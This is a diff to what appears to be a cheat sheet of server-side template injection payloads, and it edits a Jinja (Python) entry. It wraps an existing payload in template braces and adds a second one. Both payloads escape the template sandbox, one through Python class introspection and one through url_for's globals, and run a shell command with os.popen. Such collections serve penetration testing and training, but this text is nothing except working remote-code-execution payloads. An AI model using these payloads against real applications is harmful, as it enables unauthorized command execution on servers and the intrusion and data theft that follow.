@@ -7,5 +7,6 @@
 #### Jinja payload <i>(Python)</i> : 
 
 ```py
- ''.__class__.__base__.__subclasses__()[103].__init__.__globals__['sys'].modules['os'].popen("ls").read()
+ {{ ''.__class__.__base__.__subclasses__()[103].__init__.__globals__['sys'].modules['os'].popen("ls").read() }}
+ {{ url_for.__globals__.os.popen("ls").read() }}
  ```
